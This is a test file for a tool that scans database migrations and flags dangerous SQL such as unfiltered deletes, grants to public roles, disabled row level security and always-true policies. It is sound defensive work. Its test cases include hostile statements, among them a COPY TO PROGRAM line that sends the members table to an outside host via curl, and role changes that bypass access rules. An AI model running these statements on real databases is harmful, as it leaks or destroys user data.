// @vitest-environment node
import { readFileSync, readdirSync } from 'node:fs'
import { describe, expect, it } from 'vitest'
import {
  FLAGS,
  analyse,
  bodyStatement,
  describe as describeStatement,
  flagsForStatement,
  maskSql,
  parseArgs,
  renderReport,
  splitStatements,
  targetsOf,
} from './migration-report.mjs'

// S2 review control: the migration report's RED FLAGS section is deterministic
// pattern matching. Each flag is proven here on a seeded dangerous migration,
// and each has a near-miss that must NOT fire, so a regex change that silently
// stops (or over-fires) a flag fails CI.

const SEEDED = 'scripts/fixtures/migration-report/seeded-dangerous.sql'
const codes = (sql: string) => analyse('x.sql', sql).flags.map((f: { code: string }) => f.code)

describe('seeded dangerous migration', () => {
  const sql = readFileSync(SEEDED, 'utf8')
  const report = analyse(SEEDED, sql)
  const fired = new Set(report.flags.map((f: { code: string }) => f.code))

  it.each(Object.keys(FLAGS))('fires %s', (code) => {
    expect(fired.has(code)).toBe(true)
  })

  it('points each flag at the line of the dangerous statement', () => {
    const lines = sql.split('\n')
    const at = (code: string) => report.flags.filter((f: { code: string }) => f.code === code).map((f: { line: number }) => lines[f.line - 1])
    expect(at('DROP')).toEqual(['DROP TABLE public.old_widgets;', "  EXECUTE format('DROP TABLE public.%I', 'old_events');"])
    expect(at('DROP_COLUMN')).toEqual(['ALTER TABLE public.members DROP COLUMN legacy_phone;'])
    expect(at('TRUNCATE')).toEqual(['TRUNCATE public.event_refunds;'])
    expect(at('DELETE_NO_WHERE')).toEqual(['DELETE FROM public.registrations;', '  DELETE FROM public.widgets;'])
    expect(at('UPDATE_NO_WHERE')).toEqual(['UPDATE public.members SET age_bracket = NULL;'])
    expect(at('GRANT_PUBLIC_ROLE')).toEqual(['GRANT SELECT, INSERT ON public.widgets TO anon, authenticated;'])
    expect(at('SECURITY_DEFINER')).toEqual(['CREATE OR REPLACE FUNCTION public.widgets_wipe()'])
    expect(at('RLS_DISABLED')).toEqual([
      'ALTER TABLE public.participants DISABLE ROW LEVEL SECURITY;',
      'ALTER TABLE public.registrations NO FORCE ROW LEVEL SECURITY;',
    ])
    expect(at('POLICY_TRUE')).toEqual(['CREATE POLICY "anyone reads widgets" ON public.widgets'])
    expect(at('AUTH_STORAGE')).toEqual(['CREATE POLICY "anyone uploads" ON storage.objects'])
    expect(at('PRIVILEGED')).toEqual(['ALTER ROLE anon WITH BYPASSRLS;'])
    expect(at('POLICY_WIDENED')).toEqual(['ALTER POLICY "service role full access" ON public.members TO anon, authenticated;'])
    expect(at('DYNAMIC_SQL')).toEqual(["  EXECUTE format('DROP TABLE public.%I', 'old_events');"])
  })

  it('says where a flag inside a function body or dynamic SQL comes from', () => {
    const inBody = report.flags.filter((f: { where: string | null }) => f.where)
    expect(inBody).toEqual([
      expect.objectContaining({ code: 'DELETE_NO_WHERE', where: 'in the body of public.widgets_wipe' }),
      expect.objectContaining({ code: 'DROP', where: 'in dynamic SQL (EXECUTE) in a code block' }),
      expect.objectContaining({ code: 'DYNAMIC_SQL', where: 'in a code block' }),
    ])
  })

  it('ignores dangerous words in comments and string literals', () => {
    // The CREATE TABLE's default text and the block comment mention DROP TABLE,
    // TRUNCATE, DELETE and GRANT … TO anon; none of them may fire.
    const firstLines = report.flags.map((f: { line: number }) => f.line)
    expect(Math.min(...firstLines)).toBeGreaterThan(15)
  })

  it('renders a report whose RED FLAGS section lists every code, deterministically', () => {
    const md = renderReport([report])
    expect(md).toContain(`### RED FLAGS (${report.flags.length})`)
    for (const code of Object.keys(FLAGS)) expect(md).toContain(`**${code}**`)
    expect(md).toContain(`\`${SEEDED}:`)
    expect(renderReport([analyse(SEEDED, sql)])).toBe(md)
  })
})

describe('each flag, with a near miss', () => {
  it.each([
    ['DROP', 'DROP TABLE public.x;', 'CREATE TABLE public.x (id int);'],
    ['DROP', 'DROP POLICY IF EXISTS p ON public.x;', 'ALTER TABLE public.x ALTER COLUMN a DROP NOT NULL;'],
    ['DROP', 'ALTER TABLE public.x DROP CONSTRAINT x_check;', 'ALTER TABLE public.x ADD CONSTRAINT x_check CHECK (a > 0);'],
    ['DROP_COLUMN', 'ALTER TABLE public.x DROP COLUMN a;', 'ALTER TABLE public.x ADD COLUMN a text;'],
    ['DROP_COLUMN', 'ALTER TABLE ONLY public.x DROP a;', 'ALTER TABLE public.x ALTER COLUMN a DROP DEFAULT;'],
    ['DROP_COLUMN', 'ALTER TABLE public.x DROP COLUMN IF EXISTS a, ADD COLUMN b int;', 'ALTER TABLE public.x DROP CONSTRAINT IF EXISTS a;'],
    ['TRUNCATE', 'TRUNCATE TABLE public.x;', "COMMENT ON TABLE public.x IS 'never TRUNCATE';"],
    ['DELETE_NO_WHERE', 'DELETE FROM public.x;', 'DELETE FROM public.x WHERE id = 1;'],
    ['UPDATE_NO_WHERE', 'UPDATE public.x SET a = 1;', 'UPDATE public.x SET a = 1 WHERE id = 1;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.x TO anon;', 'GRANT SELECT ON public.x TO service_role;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT ALL ON public.x TO PUBLIC;', 'REVOKE ALL ON public.x FROM PUBLIC, anon, authenticated;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT EXECUTE ON FUNCTION public.f() TO authenticated, service_role;', 'GRANT EXECUTE ON FUNCTION public.f() TO service_role;'],
    ['GRANT_PUBLIC_ROLE', 'ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO anon;', 'ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE SELECT ON TABLES FROM anon;'],
    ['SECURITY_DEFINER', 'CREATE FUNCTION public.f() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ select 1 $$;', 'CREATE FUNCTION public.f() RETURNS int LANGUAGE sql SECURITY INVOKER AS $$ select 1 $$;'],
    ['RLS_DISABLED', 'ALTER TABLE public.x DISABLE ROW LEVEL SECURITY;', 'ALTER TABLE public.x ENABLE ROW LEVEL SECURITY;'],
    ['RLS_DISABLED', 'ALTER TABLE public.x NO FORCE ROW LEVEL SECURITY;', 'ALTER TABLE public.x FORCE ROW LEVEL SECURITY;'],
    ['POLICY_TRUE', 'CREATE POLICY p ON public.x FOR SELECT USING (true);', 'CREATE POLICY p ON public.x FOR SELECT TO authenticated USING (member_id = auth.uid());'],
    ['POLICY_TRUE', 'CREATE POLICY p ON public.x FOR INSERT TO authenticated WITH CHECK ( (true) );', 'CREATE POLICY p ON public.x FOR ALL TO service_role USING (true) WITH CHECK (true);'],
    ['AUTH_STORAGE', "INSERT INTO storage.buckets (id, name) VALUES ('b', 'b');", 'CREATE TABLE public.x (owner uuid REFERENCES auth.users (id));'],
    ['AUTH_STORAGE', 'CREATE TRIGGER t AFTER INSERT ON auth.users FOR EACH ROW EXECUTE FUNCTION public.f();', 'CREATE POLICY p ON public.x USING (owner = auth.uid());'],
    ['AUTH_STORAGE', 'ALTER TABLE "auth"."users" ADD COLUMN x int;', "CREATE POLICY p ON public.x USING ((storage.foldername(name))[1] = 'a');"],
    ['AUTH_STORAGE', 'GRANT USAGE ON SCHEMA storage TO service_role;', 'GRANT USAGE ON SCHEMA public TO service_role;'],
  ])('%s fires on `%s` and not on `%s`', (code, bad, near) => {
    expect(codes(bad)).toContain(code)
    expect(codes(near)).not.toContain(code)
  })

  it('flags a TRUNCATE inside a DO block', () => {
    const r = analyse('x.sql', 'DO $body$\nBEGIN\n  IF true THEN\n    TRUNCATE public.x;\n  END IF;\nEND\n$body$;')
    expect(r.flags).toEqual([expect.objectContaining({ code: 'TRUNCATE', line: 4, where: 'in a code block' })])
  })

  it('leaves the repo\'s routine migration shapes unflagged', () => {
    const sql = `
      CREATE TABLE IF NOT EXISTS public.thing (id uuid PRIMARY KEY, event_slug text NOT NULL);
      ALTER TABLE public.thing ENABLE ROW LEVEL SECURITY;
      REVOKE ALL ON public.thing FROM PUBLIC, anon, authenticated;
      GRANT SELECT, INSERT, UPDATE, DELETE ON public.thing TO service_role;
      CREATE POLICY "service role full access thing" ON public.thing FOR ALL TO service_role USING (true) WITH CHECK (true);
      CREATE INDEX IF NOT EXISTS thing_event ON public.thing (event_slug);
      COMMENT ON TABLE public.thing IS 'DROP TABLE public.thing would be bad; so would DELETE FROM it';
      ALTER TABLE public.members ALTER COLUMN age_bracket DROP NOT NULL;
      UPDATE public.thing SET event_slug = lower(event_slug) WHERE event_slug <> lower(event_slug);
      INSERT INTO public.thing (id, event_slug) VALUES (gen_random_uuid(), 'x') ON CONFLICT (id) DO UPDATE SET event_slug = excluded.event_slug;
    `
    expect(codes(sql)).toEqual([])
  })
})

describe('lexing', () => {
  it('masks comments and strings but keeps offsets and newlines', () => {
    const sql = "select 'a;b' -- c;\n/* d; /* nested; */ e; */ ;"
    const { masked } = maskSql(sql)
    expect(masked.length).toBe(sql.length)
    expect(masked.split('\n').length).toBe(2)
    for (const hidden of ['a;b', 'c;', 'd;', 'nested', 'e;']) expect(masked).not.toContain(hidden)
    expect(masked.trim().startsWith('select')).toBe(true)
    expect(splitStatements(sql)).toHaveLength(1)
  })

  it('handles doubled quotes and E-string escapes', () => {
    expect(splitStatements("select 'it''s; fine'; select E'a\\'; b';")).toHaveLength(2)
  })

  it('pulls dollar-quoted bodies out with their offsets', () => {
    const sql = 'create function f() returns void as $fn$ begin delete from t; end $fn$ language plpgsql;'
    const [st] = splitStatements(sql)
    expect(st.bodies).toHaveLength(1)
    expect(sql.slice(st.bodies[0].offset, st.bodies[0].offset + st.bodies[0].text.length)).toBe(' begin delete from t; end ')
  })

  it('reads the first SQL command out of a PL/pgSQL statement', () => {
    expect(bodyStatement('BEGIN IF x THEN DELETE FROM t')).toBe('DELETE FROM t')
    expect(bodyStatement('v := 1')).toBeNull()
  })
})

describe('describe and targets', () => {
  it.each([
    ['create table if not exists public.t (id int)', 'Creates table public.t.'],
    ['alter table public.t enable row level security', 'On table public.t: enables row level security.'],
    ['alter table public.t add column a text, add column b int', 'On table public.t: adds column a (text), adds column b (int).'],
    ['create policy p on public.t for select to authenticated using (true)', 'Creates policy p on public.t: SELECT for authenticated.'],
    ['revoke all on public.t from public, anon, authenticated', 'Revokes all on public.t from public, anon, authenticated.'],
    ['delete from public.t', 'Deletes rows from public.t (EVERY row: no WHERE).'],
    ['create or replace function public.f() returns int security definer as $$ select 1 $$', 'Creates or replaces function public.f (SECURITY DEFINER: runs as its owner, RLS does not apply).'],
  ])('%s', (sql, text) => {
    expect(describeStatement(maskSql(sql).masked)).toBe(text)
  })

  it('finds the schema-qualified target', () => {
    expect(targetsOf('create policy p on storage.objects for select using (true)')).toContain('storage.objects')
    expect(targetsOf('grant select on all tables in schema auth to service_role')).toContain('schema:auth')
  })
})

describe('report and CLI', () => {
  it('says so when no migration changed', () => {
    expect(renderReport([], { base: 'origin/dev' })).toContain('No migration files changed since origin/dev.')
  })

  it('says "None found" for a clean migration', () => {
    expect(renderReport([analyse('a.sql', 'create table public.a (id int);')])).toContain('### RED FLAGS (0)\n\nNone found.')
  })

  it('parses arguments', () => {
    expect(parseArgs(['--base', 'origin/main', '--fail-on-flags', 'a.sql'])).toEqual({ base: 'origin/main', out: null, failOnFlags: true, files: ['a.sql'] })
    expect(() => parseArgs(['--nope'])).toThrow(/Unknown option/)
  })

  it('analyses every committed migration without throwing', () => {
    const dir = 'supabase/migrations'
    const files = readdirSync(dir).filter((f) => f.endsWith('.sql'))
    expect(files.length).toBeGreaterThan(100)
    for (const f of files) expect(() => analyse(`${dir}/${f}`, readFileSync(`${dir}/${f}`, 'utf8'))).not.toThrow()
  })
})

// Review findings (S2 review round): reworded spellings of the same dangers
// once produced RED FLAGS (0). Each case here was a confirmed miss.
describe('reworded dangerous migrations', () => {
  it.each([
    // GRANTED BY / WITH GRANT OPTION after the role list.
    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO anon GRANTED BY postgres;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO authenticated WITH GRANT OPTION GRANTED BY postgres;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT service_role TO anon;'],
    // Data-modifying CTEs, and a statement that starts with WITH.
    ['DELETE_NO_WHERE', 'WITH gone AS (DELETE FROM public.registrations RETURNING id) SELECT count(*) FROM gone;'],
    ['DELETE_NO_WHERE', 'WITH x AS (SELECT 1) DELETE FROM public.registrations;'],
    ['UPDATE_NO_WHERE', 'WITH x AS (SELECT 1) UPDATE public.members SET email = null;'],
    ['UPDATE_NO_WHERE', 'WITH RECURSIVE x (n) AS (SELECT 1), y AS MATERIALIZED (UPDATE public.members SET email = null RETURNING id) SELECT * FROM y;'],
    // A WHERE inside a subquery is not the statement's WHERE.
    ['DELETE_NO_WHERE', 'DELETE FROM public.registrations USING (SELECT id FROM public.events WHERE closed) m;'],
    ['UPDATE_NO_WHERE', 'UPDATE public.members SET email = (SELECT e FROM public.x WHERE x.id = 1);'],
    // search_path pointing unqualified names at a Supabase-owned schema.
    ['AUTH_STORAGE', "SET search_path = storage;\nUPDATE buckets SET public = true WHERE id = 'uploads';"],
    ['AUTH_STORAGE', "SET search_path TO 'auth', public;"],
    // Policies that are always true without the literal USING (true).
    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO anon USING (1 = 1);'],
    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO authenticated USING ((member_id = auth.uid()) OR true);'],
    ['POLICY_TRUE', 'ALTER POLICY p ON public.members USING (true);'],
    // Widening an existing policy (e.g. a service_role USING (true) one).
    ['POLICY_WIDENED', 'ALTER POLICY service_all ON public.members TO anon, authenticated;'],
    // Role and server privileges.
    ['PRIVILEGED', 'ALTER ROLE anon WITH BYPASSRLS;'],
    ['PRIVILEGED', 'REASSIGN OWNED BY postgres TO anon;'],
    ['PRIVILEGED', "COPY public.members TO PROGRAM 'curl -d @- https://example.com';"],
    ['PRIVILEGED', 'ALTER TABLE public.members OWNER TO anon;'],
  ])('%s fires on `%s`', (code, sql) => {
    expect(codes(sql)).toContain(code)
  })

  it.each([
    ['DELETE_NO_WHERE', 'WITH x AS (SELECT id FROM public.y WHERE a) DELETE FROM public.registrations WHERE id IN (SELECT id FROM x);'],
    ['DELETE_NO_WHERE', 'DELETE FROM public.registrations r USING public.events e WHERE r.event_slug = e.slug AND e.closed;'],
    ['UPDATE_NO_WHERE', 'WITH x AS (SELECT 1) UPDATE public.members SET email = null WHERE id = 1;'],
    ['AUTH_STORAGE', "SET search_path = public;\nUPDATE buckets SET public = true WHERE id = 'uploads';"],
    ['AUTH_STORAGE', "CREATE FUNCTION public.f() RETURNS void LANGUAGE sql SET search_path = '' AS $$ DELETE FROM public.x WHERE a $$;"],
    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO anon USING (1 = 2);'],
    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO authenticated USING (member_id = auth.uid() AND true);'],
    ['POLICY_WIDENED', 'ALTER POLICY p ON public.members TO service_role;'],
    ['POLICY_WIDENED', 'ALTER POLICY p ON public.members RENAME TO anon;'],
    ['PRIVILEGED', "ALTER ROLE authenticator SET pgrst.db_schemas = 'public';"],
    ['PRIVILEGED', 'ALTER ROLE anon WITH NOBYPASSRLS;'],
    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO service_role GRANTED BY postgres;'],
  ])('%s does not fire on `%s`', (code, sql) => {
    expect(codes(sql)).not.toContain(code)
  })

  it('reads a function SET search_path clause for the body', () => {
    const r = analyse('x.sql', 'CREATE FUNCTION public.f() RETURNS void LANGUAGE sql\n  SET search_path = storage\nAS $$\n  DELETE FROM objects WHERE true\n$$;')
    expect(r.flags).toEqual(
      expect.arrayContaining([expect.objectContaining({ code: 'AUTH_STORAGE', line: 4, where: 'in the body of public.f' })]),
    )
  })

  describe('dynamic SQL', () => {
    const body = (stmt: string) => `CREATE OR REPLACE FUNCTION public.f(t text) RETURNS void LANGUAGE plpgsql AS $fn$\nBEGIN\n  ${stmt}\nEND\n$fn$;`
    it.each([
      ['DROP', "DO $$ BEGIN EXECUTE 'DROP TABLE public.registrations'; END $$;"],
      ['TRUNCATE', body("EXECUTE format('TRUNCATE %I', t);")],
      ['GRANT_PUBLIC_ROLE', body("EXECUTE 'GRANT ALL ON public.members TO anon';")],
      ['GRANT_PUBLIC_ROLE', body("EXECUTE format('GRANT SELECT ON public.%I TO anon', t);")],
      ['DROP', body("EXECUTE 'DROP TABLE ' || quote_ident(t);")],
      ['DELETE_NO_WHERE', body('EXECUTE $q$DELETE FROM public.registrations$q$;')],
      ['DELETE_NO_WHERE', body("IF t IS NOT NULL THEN EXECUTE 'WITH x AS (SELECT 1) DELETE FROM public.' || t; END IF;")],
    ])('finds %s inside `%s`, and flags the EXECUTE itself', (code, sql) => {
      const r = analyse('x.sql', sql)
      expect(r.flags.map((f: { code: string }) => f.code)).toEqual(expect.arrayContaining([code, 'DYNAMIC_SQL']))
      const inner = r.flags.find((f: { code: string }) => f.code === code)
      expect(inner.where).toMatch(/^in dynamic SQL \(EXECUTE\) in /)
    })

    it('does not mistake GRANT EXECUTE or EXECUTE FUNCTION for dynamic SQL', () => {
      expect(codes(body('GRANT EXECUTE ON FUNCTION public.g() TO service_role;'))).not.toContain('DYNAMIC_SQL')
      expect(codes('CREATE TRIGGER t AFTER INSERT ON public.x FOR EACH ROW EXECUTE FUNCTION public.f();')).not.toContain('DYNAMIC_SQL')
      expect(codes(body("PERFORM 1; RAISE NOTICE 'EXECUTE DROP TABLE x';"))).toEqual([])
    })

    it('flags the committed migration that drops constraints through EXECUTE format()', () => {
      const path = 'supabase/migrations/20261012165024_participant_retention_set_null.sql'
      const sql = readFileSync(path, 'utf8')
      const r = analyse(path, sql)
      const drops = r.flags.filter((f: { code: string }) => f.code === 'DROP')
      expect(drops.map((f: { line: number }) => f.line)).toEqual([36, 55, 73, 91])
      for (const f of drops) expect(sql.split('\n')[f.line - 1]).toMatch(/EXECUTE format\('ALTER TABLE public\.\w+ DROP CONSTRAINT %I'/)
      expect(renderReport([r])).not.toContain('### RED FLAGS (0)')
    })
  })
})

describe('flagsForStatement', () => {
  it('returns each code once per statement', () => {
    expect(flagsForStatement('alter table public.x drop column a, drop column b')).toEqual(['DROP_COLUMN'])
  })
})
